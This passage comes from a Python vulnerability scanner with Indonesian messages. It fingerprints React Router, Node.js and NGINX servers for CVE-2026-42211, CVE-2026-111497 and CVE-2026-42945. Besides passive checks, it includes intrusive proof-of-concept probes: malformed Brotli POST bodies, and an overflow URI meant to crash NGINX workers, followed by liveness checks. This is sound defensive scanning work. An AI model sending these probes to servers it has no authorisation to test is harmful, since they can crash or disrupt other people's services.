        result["vulnerable"] = None
        result["verdict"] = "INCONCLUSIVE"
        result["reason"] = (
            f"respons HTTP {result['status_code']} dapat berupa blokir "
            "WAF/autentikasi; indikator kerentanan tidak dapat dipastikan"
        )
        return result

    result["vulnerable"] = False
    result["verdict"] = "NOT VULNERABLE"
    result["reason"] = "tidak ditemukan indikator kerentanan"
    return result


# ---------------------------------------------------------------------------
# Engine React Router: CVE-2026-42211
# ---------------------------------------------------------------------------


def react_router_extract_version(
    text: str, headers: Optional[Dict[str, str]] = None
) -> Optional[str]:
    if headers:
        value = header_value(headers, "x-react-router-version")
        if value:
            match = re.search(r"(\d+\.\d+\.\d+)", value)
            if match:
                return match.group(1)
        value = header_value(headers, "x-powered-by")
        if value and re.search(r"react[\s-]?router", value, re.IGNORECASE):
            match = re.search(r"(\d+\.\d+\.\d+)", value)
            if match:
                return match.group(1)
    for pattern in REACT_ROUTER_VERSION_PATTERNS:
        match = pattern.search(text)
        if match:
            return match.group(1)
    return None


def react_router_parse_version(
    value: Optional[str],
) -> Optional[Tuple[int, int, int]]:
    if not value:
        return None
    parts = value.split(".")
    if len(parts) != 3:
        return None
    try:
        parsed = tuple(int(part) for part in parts)
    except ValueError:
        return None
    return (parsed[0], parsed[1], parsed[2])


def react_router_version_status(value: Optional[str]) -> Optional[bool]:
    parsed = react_router_parse_version(value)
    if parsed is None:
        return None
    if parsed < REACT_ROUTER_AFFECTED_MIN:
        return False
    return parsed < REACT_ROUTER_FIXED_VERSION


def react_router_detect(
    body: bytes, headers: Optional[Dict[str, str]] = None
) -> dict:
    text = body.decode("utf-8", "replace")
    lower = body.lower()
    evidence = [
        marker.decode("ascii")
        for marker in REACT_ROUTER_MARKERS
        if marker in lower
    ]
    version = react_router_extract_version(text, headers)
    manifest_path = "/__manifest"
    match = REACT_ROUTER_MANIFEST_PATH_PATTERN.search(text)
    if match:
        candidate = match.group(1)
        parsed = urlsplit(candidate)
        if parsed.scheme or parsed.netloc:
            candidate = parsed.path
        if candidate.startswith("/"):
            manifest_path = candidate
    return {
        "detected": bool(evidence),
        "mode": "framework" if evidence else None,
        "version": version,
        "affected": react_router_version_status(version),
        "manifest_path": manifest_path,
        "manifest_checked": False,
        "evidence": evidence,
    }


def react_router_get_once(
    url: str,
    headers: Dict[str, str],
    timeout: int,
    verify_ssl: TLSVerify,
) -> Tuple[Optional[requests.Response], bytes, Optional[str]]:
    attempts = max(0, RUNTIME.retries) + 1
    response: Optional[requests.Response] = None
    body = b""
    error: Optional[str] = None

    for attempt in range(attempts):
        response = None
        body = b""
        error = None
        RUNTIME.wait()
        try:
            response = requests.get(
                url,
                headers=headers,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=False,
                stream=True,
                proxies=request_proxies(),
            )
            body = (
                response.raw.read(
                    REACT_ROUTER_BODY_LIMIT, decode_content=True
                )
                or b""
            )
            response._content = body
            response._content_consumed = True
            response.close()
        except requests.exceptions.SSLError as exc:
            error = tls_error_message(exc)
        except requests.exceptions.ConnectionError as exc:
            error = f"kesalahan koneksi: {exc}"
        except requests.exceptions.Timeout:
            error = REACT_TIMEOUT_MESSAGE
        except RequestException as exc:
            error = f"permintaan gagal: {exc}"
        except Exception as exc:
            error = f"kesalahan tak terduga: {exc}"

        if attempt + 1 >= attempts or not react_should_retry(response, error):
            return response, body, error

        retry_after = None
        if response is not None:
            retry_after = retry_after_seconds(
                {name: value for name, value in response.headers.items()}
            )
            response.close()
        RUNTIME.backoff(attempt, retry_after)

    return response, body, error


def react_router_fetch(
    url: str,
    headers: Dict[str, str],
    timeout: int,
    verify_ssl: TLSVerify,
    max_redirects: int = 10,
) -> Tuple[Optional[requests.Response], bytes, str, Optional[str]]:
    current_url = url
    original = urlsplit(url)
    response: Optional[requests.Response] = None
    body = b""

    for _ in range(max_redirects + 1):
        response, body, error = react_router_get_once(
            current_url, headers, timeout, verify_ssl
        )
        if error:
            return response, body, current_url, error

        location = response.headers.get("Location")
        if (
            response.status_code not in (301, 302, 303, 307, 308)
            or not location
        ):
            return response, body, current_url, None

        next_url = urljoin(current_url, location)
        next_parsed = urlsplit(next_url)
        if next_parsed.scheme not in ("http", "https"):
            return response, body, current_url, None
        if next_parsed.netloc != original.netloc:
            return response, body, current_url, None
        if original.scheme == "https" and next_parsed.scheme != "https":
            return response, body, current_url, None
        current_url = next_url

    return response, body, current_url, None


def react_router_request_dump(url: str, headers: Dict[str, str]) -> str:
    parsed = urlparse(url)
    target = parsed.path or "/"
    if parsed.query:
        target += "?" + parsed.query
    lines = [f"GET {target} HTTP/1.1", f"Host: {parsed.netloc}"]
    for key, value in headers.items():
        lines.append(f"{key}: {redact_header(key, value)}")
    return "\r\n".join(lines) + "\r\n"


def react_router_response_dump(
    response: requests.Response, body: bytes
) -> str:
    text = body.decode("utf-8", "replace")
    lines = [f"HTTP/1.1 {response.status_code} {response.reason}"]
    for key, value in response.headers.items():
        lines.append(f"{key}: {redact_header(key, value)}")
    return "\r\n".join(lines) + "\r\n\r\n" + text[:2000]


def react_router_base_result(host: str) -> dict:
    return {
        "engine": "react-router",
        "cve": REACT_ROUTER_CVES,
        "host": host,
        "vulnerable": None,
        "verdict": "ERROR",
        "status_code": None,
        "error": None,
        "reason": None,
        "request": None,
        "response": None,
        "final_url": None,
        "tested_url": None,
        "framework": None,
        "timestamp": utc_now(),
    }


# ---------------------------------------------------------------------------
# Engine Node.js: CVE-2026-111497 (Brotli decoder) - passive + PoC
# ---------------------------------------------------------------------------


def nodejs_poc_request_dump(
    url: str, headers: Dict[str, str], payload_len: int
) -> str:
    parsed = urlparse(url)
    target = parsed.path or "/"
    if parsed.query:
        target += "?" + parsed.query
    lines = [
        f"POST {target} HTTP/1.1",
        f"Host: {parsed.netloc}",
        f"Content-Length: {payload_len}",
    ]
    for key, value in headers.items():
        lines.append(f"{key}: {redact_header(key, value)}")
    return "\r\n".join(lines) + "\r\n"


def nodejs_poc_send(
    url: str,
    headers: Dict[str, str],
    payload: bytes,
    timeout: int,
    verify_ssl: TLSVerify,
) -> Tuple[Optional[requests.Response], Optional[str]]:
    response: Optional[requests.Response] = None
    error: Optional[str] = None
    RUNTIME.wait()
    try:
        response = requests.post(
            url,
            headers=headers,
            data=payload,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False,
            stream=True,
            proxies=request_proxies(),
        )
        body = b""
        try:
            body = (
                response.raw.read(REACT_BODY_READ_LIMIT, decode_content=True)
                or b""
            )
        finally:
            response._content = body
            response._content_consumed = True
            response.close()
    except requests.exceptions.SSLError as exc:
        error = tls_error_message(exc)
    except requests.exceptions.ConnectionError as exc:
        error = f"kesalahan koneksi: {exc}"
    except requests.exceptions.Timeout:
        error = REACT_TIMEOUT_MESSAGE
    except RequestException as exc:
        error = f"permintaan gagal: {exc}"
    except Exception as exc:
        error = f"kesalahan tak terduga: {exc}"

    return response, error


def nodejs_poc_control_check(
    response: Optional[requests.Response], error: Optional[str]
) -> Tuple[bool, str, Optional[str]]:
    if error:
        return True, error, None
    if response is None:
        return True, "tidak ada respons", None

    body = (response.content or b"").lower()
    for marker in (
        NODEJS_BROTLI_VULNERABLE_MARKERS + NODEJS_BROTLI_PATCHED_MARKERS
    ):
        if marker in body:
            label = marker.decode("ascii", errors="replace")
            return True, f"marker {label} muncul pada body kontrol", label
    if response.status_code in REACT_BLOCKED_STATUSES or response.status_code >= 500:
        return True, f"HTTP {response.status_code}", None
    return False, "", None


def nodejs_poc_classify(
    response: Optional[requests.Response], error: Optional[str]
) -> Tuple[Optional[bool], str]:
    if error:
        if "timeout" in error.lower():
            return (
                None,
                "timeout setelah payload Brotli; kemungkinan decoder "
                "hang/DoS, perlu konfirmasi manual",
            )
        return None, error
    if response is None:
        return None, "tidak ada respons"

    body = (response.content or b"").lower()
    if any(marker in body for marker in NODEJS_BROTLI_VULNERABLE_MARKERS):
        return (
            True,
            "decoder mengembalikan FORMAT_BLOCK_LENGTH_1 "
            "(state tidak valid tetap diproses)",
        )
    if any(marker in body for marker in NODEJS_BROTLI_PATCHED_MARKERS):
        return (
            False,
            "decoder menolak dengan FORMAT_BLOCK_SWITCH "
            "(perilaku versi yang sudah dipatch)",
        )
    if response.status_code in (400, 415, 422, 500) and any(
        marker in body for marker in NODEJS_BROTLI_DECODER_MARKERS
    ):
        return (
            None,
            f"HTTP {response.status_code} mengindikasikan Brotli decoding, "
            "tetapi kode error decoder tidak terekspos",
        )
    return (
        None,
        f"HTTP {response.status_code} tidak menunjukkan error decoder "
        "Brotli (endpoint mungkin tidak mendekode Content-Encoding: br)",
    )


def nodejs_check_vulnerability(
    host: str,
    timeout: int = REACT_ROUTER_DEFAULT_TIMEOUT,
    verify_ssl: TLSVerify = True,
    custom_headers: Optional[Dict[str, str]] = None,
    paths: Optional[List[str]] = None,
) -> dict:
    display_host = safe_url_label(host)
    result = {
        "engine": "nodejs",
        "cve": NODEJS_BROTLI_CVES,
        "host": display_host,
        "vulnerable": None,
        "verdict": "ERROR",
        "status_code": None,
        "error": None,
        "reason": None,
        "request": None,
        "response": None,
        "final_url": None,
        "tested_url": None,
        "timestamp": utc_now(),
    }

    try:
        normalized = normalize_url(host, REACT_ROUTER_DEFAULT_PATH)
    except ValueError as exc:
        result["error"] = str(exc)
        result["reason"] = str(exc)
        return result

    result["host"] = normalized
    base_path = urlsplit(normalized).path or REACT_ROUTER_DEFAULT_PATH
    test_paths = paths if paths else [base_path]

    headers = dict(BROWSER_DEFAULT_HEADERS)
    set_header(
        headers,
        "Accept",
        "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
    )
    if custom_headers:
        for name, value in custom_headers.items():
            if name.lower() != "proxy-authorization":
                set_header(headers, name, value)

    for idx, path in enumerate(test_paths):
        path = path if path.startswith("/") else "/" + path
        test_url = replace_path(normalized, path, REACT_ROUTER_DEFAULT_PATH)
        result["tested_url"] = test_url
        result["final_url"] = test_url
        result["request"] = react_router_request_dump(test_url, headers)

        response, body, final_url, error = react_router_fetch(
            test_url, headers, timeout, verify_ssl
        )

        if error:
            if response is not None:
                response.close()
            if idx < len(test_paths) - 1:
                continue
            result["error"] = error
            result["reason"] = error
            result["verdict"] = "ERROR"
            return result

        result["final_url"] = final_url
        result["status_code"] = response.status_code
        result["response"] = react_router_response_dump(response, body)

        if response.status_code in REACT_BLOCKED_STATUSES:
            if idx < len(test_paths) - 1:
                continue
            result["vulnerable"] = None
            result["verdict"] = "INCONCLUSIVE"
            result["reason"] = (
                f"respons HTTP {response.status_code} dapat berupa blokir "
                "WAF/autentikasi; keberadaan Node.js tidak dapat dipastikan"
            )
            return result

        try:
            lower = body.lower()
        except Exception:
            lower = b""
        header_map = {name.lower(): value for name, value in response.headers.items()}
        node_indicators = []
        xpb = header_map.get("x-powered-by", "").lower()
        if "express" in xpb or "node" in xpb:
            node_indicators.append("x-powered-by")
        if b"express" in lower:
            node_indicators.append("body")
        server = header_map.get("server", "").lower()
        if server in ("node", "nodejs"):
            node_indicators.append("server")
        if b"node.js" in lower or b"nodejs" in lower:
            node_indicators.append("body-node")
        if (
            any(
                name in header_map
                for name in (
                    "x-nextjs-cache",
                    "x-nextjs-request-id",
                    "x-nextjs-html-request-id",
                    "x-matched-path",
                )
            )
            or b"__next_data__" in lower
            or b"/_next/static/" in lower
            or b"self.__next_f" in lower
        ):
            node_indicators.append("nextjs")

        if not node_indicators:
            if idx < len(test_paths) - 1:
                continue
            result["vulnerable"] = False
            result["verdict"] = "NOT VULNERABLE"
            result["reason"] = "Tidak ada indikasi aplikasi berbasis Node.js terdeteksi"
            return result

        result["vulnerable"] = None
        result["verdict"] = "INCONCLUSIVE"
        result["evidence"] = sorted(set(node_indicators))
        result["reason"] = (
            "Indikasi Node.js/Next.js terdeteksi (CVE-2026-111497). "
            "Versi Node.js tidak muncul di respons HTTP. "
            "Periksa `node -v` pada server/container; jika menggunakan Node.js < 22.23.4 / < 24.22.1 / < 26.12.1 atau EOL, perlu di-update ke versi patch."
        )
        return result

    result["vulnerable"] = False
    result["verdict"] = "NOT VULNERABLE"
    result["reason"] = "Tidak ada indikasi Node.js pada path yang diuji"
    return result


def nodejs_poc_check_vulnerability(
    host: str,
    timeout: int = REACT_ROUTER_DEFAULT_TIMEOUT,
    verify_ssl: TLSVerify = True,
    custom_headers: Optional[Dict[str, str]] = None,
    paths: Optional[List[str]] = None,
) -> dict:
    passive = nodejs_check_vulnerability(
        host,
        timeout=timeout,
        verify_ssl=verify_ssl,
        custom_headers=custom_headers,
        paths=paths,
    )
    if passive.get("verdict") == "ERROR":
        return passive
    if passive.get("status_code") in REACT_BLOCKED_STATUSES:
        passive["reason"] = (
            "PoC Node.js tidak dikirim karena pemeriksaan pasif menerima "
            f"HTTP {passive.get('status_code')} (blokir WAF/autentikasi)"
        )
        return passive

    result = dict(passive)
    result["vulnerable"] = None
    result["verdict"] = "INCONCLUSIVE"

    try:
        normalized = normalize_url(host, REACT_ROUTER_DEFAULT_PATH)
    except ValueError as exc:
        result["error"] = str(exc)
        result["reason"] = str(exc)
        result["verdict"] = "ERROR"
        return result

    base_path = urlsplit(normalized).path or REACT_ROUTER_DEFAULT_PATH
    test_paths = paths if paths else [base_path]

    headers = dict(BROWSER_DEFAULT_HEADERS)
    set_header(headers, "Accept", "application/json, text/plain, */*")
    set_header(headers, "Content-Type", "application/json")
    set_header(headers, "Content-Encoding", "br")
    if custom_headers:
        for name, value in custom_headers.items():
            if name.lower() != "proxy-authorization":
                set_header(headers, name, value)

    result.update(
        {
            "control_passed": False,
            "control_status_code": None,
            "control_error": None,
            "control_marker": None,
            "control_request": None,
            "control_response": None,
        }
    )

    passive_hint = ""
    if "Indikasi Node.js" in (passive.get("reason") or ""):
        passive_hint = "Node.js/Next.js terindikasi pada pemeriksaan pasif; "

    reasons = []
    patched = 0
    total = 0
    for path in test_paths:
        path = path if path.startswith("/") else "/" + path
        test_url = replace_path(normalized, path, REACT_ROUTER_DEFAULT_PATH)

        control_payload = NODEJS_BROTLI_CONTROL_PAYLOAD
        result["control_request"] = nodejs_poc_request_dump(
            test_url, headers, len(control_payload)
        )
        control_response, control_error = nodejs_poc_send(
            test_url, headers, control_payload, timeout, verify_ssl
        )
        result["control_status_code"] = (
            control_response.status_code if control_response is not None else None
        )
        result["control_error"] = control_error
        result["control_response"] = (
            react_router_response_dump(
                control_response, control_response.content or b""
            )
            if control_response is not None
            else None
        )
        control_blocked, control_reason, control_marker = (
            nodejs_poc_control_check(control_response, control_error)
        )
        result["control_marker"] = control_marker
        if control_blocked:
            result["control_passed"] = False
            result["reason"] = (
                f"Kontrol negatif Brotli valid gagal ({control_reason}); "
                "PoC Node.js tidak dikirim."
            )
            return result
        result["control_passed"] = True

        for vector_name, payload in NODEJS_BROTLI_POC_VECTORS:
            total += 1
            result["tested_url"] = test_url
            result["final_url"] = test_url
            result["request"] = nodejs_poc_request_dump(
                test_url, headers, len(payload)
            )
            response, error = nodejs_poc_send(
                test_url, headers, payload, timeout, verify_ssl
            )
            result["status_code"] = (
                response.status_code if response is not None else None
            )
            if response is not None:
                result["response"] = react_router_response_dump(
                    response, response.content or b""
                )
            else:
                result["response"] = None

            vulnerable, reason = nodejs_poc_classify(response, error)
            if vulnerable is True:
                result["vulnerable"] = True
                result["verdict"] = "RENTAN"
                result["reason"] = (
                    f"PoC Node.js Brotli ({vector_name}): {reason}. "
                    "Decoder melanjutkan pemrosesan setelah invalid block "
                    "switch (CVE-2026-111497)"
                )
                return result
            if vulnerable is False:
                patched += 1
            reasons.append(f"{vector_name}: {reason}")

    if total and patched == total:
        result["vulnerable"] = False
        result["verdict"] = "NOT VULNERABLE"
        result["reason"] = (
            "PoC Node.js Brotli: decoder menolak dengan FORMAT_BLOCK_SWITCH "
            "pada semua vektor; versi tampak sudah dipatch"
        )
    else:
        result["vulnerable"] = None
        result["verdict"] = "INCONCLUSIVE"
        result["reason"] = (
            passive_hint
            + "PoC Node.js Brotli tidak dapat menyimpulkan status decoder. "
            + " | ".join(reasons[:2])
        )
    return result


# ---------------------------------------------------------------------------
# Engine NGINX: CVE-2026-42945 (ngx_http_rewrite_module) - passive + PoC
# ---------------------------------------------------------------------------


def nginx_base_result(host: str) -> dict:
    return {
        "engine": "nginx",
        "cve": NGINX_CVES,
        "host": host,
        "vulnerable": None,
        "verdict": "ERROR",
        "status_code": None,
        "error": None,
        "reason": None,
        "request": None,
        "response": None,
        "final_url": None,
        "tested_url": None,
        "tested_path": None,
        "control_tested_url": None,
        "control_tested_path": None,
        "control_status_code": None,
        "control_error": None,
        "control_crash_like": False,
        "control_passed": False,
        "control_request": None,
        "control_response": None,
        "server": None,
        "version": None,
        "version_affected": None,
        "nginx_detected": False,
        "evidence": [],
        "timestamp": utc_now(),
    }


def nginx_parse_version(value: Optional[str]) -> Optional[Tuple[int, int, int]]:
    if not value:
        return None
    match = NGINX_VERSION_PATTERN.search(value)
    if not match:
        return None
    return tuple(int(part) for part in match.groups())


def nginx_version_affected(
    version: Optional[Tuple[int, int, int]],
) -> Optional[bool]:
    if version is None:
        return None
    if version < NGINX_AFFECTED_MIN:
        return False
    if version >= NGINX_FIXED_VERSION:
        return False
    return version <= NGINX_AFFECTED_MAX


def nginx_version_text(
    version: Optional[Tuple[int, int, int]],
) -> Optional[str]:
    if version is None:
        return None
    return ".".join(str(part) for part in version)


def nginx_check_vulnerability(
    host: str,
    timeout: int = NGINX_DEFAULT_TIMEOUT,
    verify_ssl: TLSVerify = True,
    custom_headers: Optional[Dict[str, str]] = None,
    paths: Optional[List[str]] = None,
) -> dict:
    display_host = safe_url_label(host)
    result = nginx_base_result(display_host)

    try:
        normalized = normalize_url(host, NGINX_DEFAULT_PATH)
    except ValueError as exc:
        result["error"] = str(exc)
        result["reason"] = str(exc)
        return result

    result["host"] = normalized
    base_path = urlsplit(normalized).path or NGINX_DEFAULT_PATH
    test_paths = paths if paths else [base_path]

    headers = dict(BROWSER_DEFAULT_HEADERS)
    set_header(
        headers,
        "Accept",
        "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
    )
    if custom_headers:
        for name, value in custom_headers.items():
            if name.lower() != "proxy-authorization":
                set_header(headers, name, value)

    for idx, path in enumerate(test_paths):
        path = path if path.startswith("/") else "/" + path
        test_url = replace_path(normalized, path, NGINX_DEFAULT_PATH)
        result["tested_url"] = test_url
        result["tested_path"] = path
        result["final_url"] = test_url
        result["request"] = react_router_request_dump(test_url, headers)

        response, body, final_url, error = react_router_fetch(
            test_url, headers, timeout, verify_ssl
        )

        if error:
            if response is not None:
                response.close()
            if idx < len(test_paths) - 1:
                continue
            result["error"] = error
            result["reason"] = error
            result["verdict"] = "ERROR"
            return result

        result["final_url"] = final_url
        result["status_code"] = response.status_code
        result["response"] = react_router_response_dump(response, body)

        if response.status_code in REACT_BLOCKED_STATUSES:
            if idx < len(test_paths) - 1:
                continue
            result["vulnerable"] = None
            result["verdict"] = "INCONCLUSIVE"
            result["reason"] = (
                f"respons HTTP {response.status_code} dapat berupa blokir "
                "WAF/autentikasi; keberadaan NGINX tidak dapat dipastikan"
            )
            return result

        server_header = response.headers.get("Server") or ""
        result["server"] = server_header or None
        lower = body.lower()
        detection_text = (
            server_header + " " + body.decode("utf-8", "replace")
        ).lower()
        server_lower = server_header.lower()
        body_nginx = (
            b"nginx/" in lower
            or b"server: nginx" in lower
            or b"<center>nginx</center>" in lower
            or b"openresty" in lower
        )
        nginx_detected = (
            "nginx" in server_lower
            or "openresty" in server_lower
            or body_nginx
        )
        version = nginx_parse_version(server_header) or nginx_parse_version(
            detection_text
        )
        version_text = nginx_version_text(version)
        version_affected = nginx_version_affected(version)
        evidence = []
        if server_header:
            evidence.append(f"server:{server_header}")
        if body_nginx:
            evidence.append("body")
        if version_text:
            evidence.append(f"version:{version_text}")
        if "openresty" in server_lower:
            evidence.append("openresty")
        result["nginx_detected"] = nginx_detected
        result["version"] = version_text
        result["version_affected"] = version_affected
        result["evidence"] = evidence

        if not nginx_detected:
            if idx < len(test_paths) - 1:
                continue
            result["vulnerable"] = False
            result["verdict"] = "NOT VULNERABLE"
            result["reason"] = "Tidak ada indikasi NGINX pada respons HTTP"
            return result

        if version_affected is False:
            result["vulnerable"] = False
            result["verdict"] = "NOT VULNERABLE"
            if version is not None and version < NGINX_AFFECTED_MIN:
                result["reason"] = (
                    f"NGINX {version_text} lebih lama dari 0.6.27; "
                    "tidak termasuk rentang terdampak"
                )
            else:
                result["reason"] = (
                    f"NGINX {version_text} sudah dipatch "
                    "(fixed 1.30.1 / 1.31.0+)"
                )
            return result

        result["vulnerable"] = None
        result["verdict"] = "INCONCLUSIVE"
        if version_affected is True:
            result["reason"] = (
                f"NGINX {version_text} berada di rentang terdampak "
                "(0.6.27-1.30.0); konfigurasi rewrite+set dengan capture "
                "belum diverifikasi. Gunakan --nginx-poc untuk probe "
                "(intrusif)."
            )
        else:
            result["reason"] = (
                "Indikasi NGINX terdeteksi, versi tidak terungkap. Rentang "
                "terdampak 0.6.27-1.30.0; fixed 1.30.1 / 1.31.0+. Periksa "
                "`nginx -v` atau gunakan --nginx-poc (intrusif)."
            )
        return result

    result["vulnerable"] = False
    result["verdict"] = "NOT VULNERABLE"
    result["reason"] = "Tidak ada indikasi NGINX pada path yang diuji"
    return result


def nginx_poc_build_path(path: str) -> str:
    prefix = urlsplit(path).path or "/"
    prefix = prefix if prefix.startswith("/") else "/" + prefix
    prefix = prefix.rstrip("/")
    payload = (
        b"A" * NGINX_POC_PAD_A
        + b"+" * NGINX_POC_PAD_PLUS
        + NGINX_POC_TARGET
    ).decode("ascii")
    return f"{prefix}/{payload}"


def nginx_poc_build_control_path(path: str) -> str:
    prefix = urlsplit(path).path or "/"
    prefix = prefix if prefix.startswith("/") else "/" + prefix
    prefix = prefix.rstrip("/")
    return f"{prefix}/{'A' * NGINX_POC_CONTROL_PAD}"


def nginx_poc_send(
    url: str,
    headers: Dict[str, str],
    timeout: int,
    verify_ssl: TLSVerify,
) -> Tuple[Optional[requests.Response], bytes, Optional[str]]:
    response: Optional[requests.Response] = None
    body = b""
    error: Optional[str] = None
    RUNTIME.wait()
    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False,
            stream=True,
            proxies=request_proxies(),
        )
        try:
            body = (
                response.raw.read(NGINX_BODY_READ_LIMIT, decode_content=True)
                or b""
            )
        finally:
            response._content = body
            response._content_consumed = True
            response.close()
    except requests.exceptions.SSLError as exc:
        error = tls_error_message(exc)
    except requests.exceptions.ConnectionError as exc:
        error = f"kesalahan koneksi: {exc}"
    except requests.exceptions.Timeout:
        error = REACT_TIMEOUT_MESSAGE
    except RequestException as exc:
        error = f"permintaan gagal: {exc}"
    except Exception as exc:
        error = f"kesalahan tak terduga: {exc}"

    return response, body, error


def nginx_poc_crash_like(error: Optional[str]) -> bool:
    if not error:
        return False
    text = error.lower()
    if "timeout" in text:
        return False
    markers = (
        "connection aborted",
        "connection reset",
        "connection broken",
        "remote end closed",
        "remotedisconnected",
        "empty response",
        "eof occurred",
        "unexpected_eof",
        "eof while reading",
        "forcibly closed",
        "winerror 10054",
    )
    return any(marker in text for marker in markers)


def nginx_liveness_probe(
    url: str,
    headers: Dict[str, str],
    timeout: int,
    verify_ssl: TLSVerify,
) -> Tuple[bool, Optional[str]]:
    response, _body, error = nginx_poc_send(
        url, headers, min(timeout, 5), verify_ssl
    )
    if error:
        return False, error
    if response is None:
        return False, "tidak ada respons"
    return True, None


def nginx_poc_check_vulnerability(
    host: str,
    timeout: int = NGINX_DEFAULT_TIMEOUT,
    verify_ssl: TLSVerify = True,
    custom_headers: Optional[Dict[str, str]] = None,
    paths: Optional[List[str]] = None,
    baseline_blocked: bool = False,
) -> dict:
    passive = nginx_check_vulnerability(
        host,
        timeout=timeout,
        verify_ssl=verify_ssl,
        custom_headers=custom_headers,
        paths=paths,
    )
    if passive.get("verdict") == "ERROR":
        return passive
    if baseline_blocked:
        passive["reason"] = (
            "PoC NGINX tidak dikirim karena baseline mendeteksi "
            "blokir/challenge WAF; hasil pasif: "
            f"{passive.get('reason') or 'tidak ada kesimpulan'}"
        )
        return passive
    if passive.get("status_code") in REACT_BLOCKED_STATUSES:
        passive["reason"] = (
            "PoC NGINX tidak dikirim karena pemeriksaan pasif menerima "
            f"HTTP {passive.get('status_code')} (blokir WAF/autentikasi); "
            f"hasil pasif: {passive.get('reason') or 'tidak ada kesimpulan'}"
        )
        return passive
    if not passive.get("nginx_detected"):
        passive["reason"] = (
            "PoC NGINX tidak dikirim karena NGINX tidak terdeteksi; "
            f"{passive.get('reason') or 'tidak ada indikasi NGINX'}"
        )
        return passive
    if passive.get("version_affected") is False:
        passive_reason = passive.get("reason") or (
            "Versi NGINX tidak termasuk rentang terdampak"
        )
        passive["reason"] = f"{passive_reason}; PoC NGINX tidak dikirim."
        return passive

    result = dict(passive)
    result["vulnerable"] = None
    result["verdict"] = "INCONCLUSIVE"

    try:
        normalized = normalize_url(host, NGINX_DEFAULT_PATH)
    except ValueError as exc:
        result["error"] = str(exc)
        result["reason"] = str(exc)
        result["verdict"] = "ERROR"
        return result

    base_path = urlsplit(normalized).path or NGINX_DEFAULT_PATH
    test_paths = paths if paths else [base_path]
    if paths:
        path = passive.get("tested_path") or test_paths[0]
    elif base_path not in ("", "/"):
        path = base_path
    else:
        path = NGINX_POC_DEFAULT_PATH
    path = path if path.startswith("/") else "/" + path
    liveness_url = replace_path(normalized, path, NGINX_DEFAULT_PATH)
    probe_path = nginx_poc_build_path(path)
    probe_url = replace_path(
        normalized, probe_path, NGINX_DEFAULT_PATH
    )
    result["tested_path"] = path

    headers = dict(BROWSER_DEFAULT_HEADERS)
    set_header(
        headers,
        "Accept",
        "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
    )
    if custom_headers:
        for name, value in custom_headers.items():
            if name.lower() != "proxy-authorization":
                set_header(headers, name, value)

    control_path = nginx_poc_build_control_path(path)
    control_url = replace_path(
        normalized, control_path, NGINX_DEFAULT_PATH
    )
    result["control_tested_path"] = control_path
    result["control_tested_url"] = control_url
    result["control_request"] = react_router_request_dump(
        control_url, headers
    )
    control_response, control_body, control_error = nginx_poc_send(
        control_url, headers, timeout, verify_ssl
    )
    control_status = (
        control_response.status_code
        if control_response is not None
        else None
    )
    result["control_status_code"] = control_status
    if control_response is not None:
        result["control_response"] = react_router_response_dump(
            control_response, control_body
        )
    if control_error:
        result["control_error"] = control_error
        result["control_crash_like"] = nginx_poc_crash_like(
            control_error
        )
        result["vulnerable"] = None
        result["verdict"] = "INCONCLUSIVE"
        result["reason"] = (
            "Kontrol negatif (URI panjang tanpa pola overflow) gagal: "
            f"{control_error}. Reset/error juga dapat berasal dari WAF/"
            "proxy; probe overflow tidak dikirim."
        )
        return result
    if control_response is None:
        result["vulnerable"] = None
        result["verdict"] = "INCONCLUSIVE"
        result["reason"] = (
            "Kontrol negatif (URI panjang tanpa pola overflow) tidak "
            "menghasilkan respons; probe overflow tidak dikirim."
        )
        return result
    if (
        control_status in NGINX_CONTROL_BLOCKED_STATUSES
        or control_status >= 500
    ):
        result["vulnerable"] = None
        result["verdict"] = "INCONCLUSIVE"
        result["reason"] = (
            "Kontrol negatif (URI panjang tanpa pola overflow) "
            f"menghasilkan HTTP {control_status}; target menolak URI "
            "panjang atau memblokir WAF/proxy. Probe overflow tidak "
            "dikirim."
        )
        return result
    result["control_passed"] = True

    result["tested_url"] = probe_url
    result["final_url"] = probe_url
    result["request"] = react_router_request_dump(probe_url, headers)
    response, body, error = nginx_poc_send(
        probe_url, headers, timeout, verify_ssl
    )
    result["status_code"] = (
        response.status_code if response is not None else None
    )
    if response is not None:
        result["response"] = react_router_response_dump(response, body)
    else:
        result["response"] = None
    if error:
        result["probe_error"] = error
    crash_like = nginx_poc_crash_like(error)

    time.sleep(0.4)
    alive, live_error = nginx_liveness_probe(
        liveness_url, headers, timeout, verify_ssl
    )
    if not alive:
        time.sleep(1.0)
        alive, live_error = nginx_liveness_probe(
            liveness_url, headers, timeout, verify_ssl
        )
    if not alive:
        time.sleep(2.0)
        alive, live_error = nginx_liveness_probe(
            liveness_url, headers, timeout, verify_ssl
        )
    result["timestamp"] = utc_now()
    if not alive:
        result["vulnerable"] = None
        result["verdict"] = "INCONCLUSIVE"
        result["liveness_error"] = live_error
        result["reason"] = (
            "Probe overflow NGINX dikirim, tetapi server tidak merespons "
            f"setelah probe ({live_error or 'tanpa respons'}); status tidak "
            "dapat disimpulkan. Periksa kesehatan server secara manual."
        )
        return result

    result["liveness_recovered"] = True
    if crash_like:
        result["vulnerable"] = True
        result["verdict"] = "RENTAN"
        result["reason"] = (
            "Kontrol negatif normal, lalu probe overflow NGINX memutus "
            "koneksi/pekerja dan server pulih; mengindikasikan heap "
            "overflow pada rewrite+set (CVE-2026-42945). Konfirmasi dengan "
            "log worker/nginx -V; probe ini tidak mengeksekusi perintah."
        )
        return result

    result["vulnerable"] = None
    result["verdict"] = "INCONCLUSIVE"
    if response is not None:
        result["reason"] = (
            f"Probe overflow NGINX dijawab HTTP {response.status_code} dan "
            "server tetap hidup; konfigurasi rewrite+set yang rentan tidak "
            "terbukti. Versi terdampak saja tidak cukup untuk menyimpulkan "
            "RENTAN."
        )
    else:
        detail = f" ({error})" if error else ""
        result["reason"] = (
            "Probe overflow NGINX tidak menghasilkan sinyal crash yang "
            f"jelas{detail}; konfigurasi rewrite+set yang rentan tidak "
            "terbukti."
        )
    return result


def react_router_check_vulnerability(
    host: str,
    timeout: int = REACT_ROUTER_DEFAULT_TIMEOUT,
    verify_ssl: TLSVerify = True,
    custom_headers: Optional[Dict[str, str]] = None,
    paths: Optional[List[str]] = None,
) -> dict:
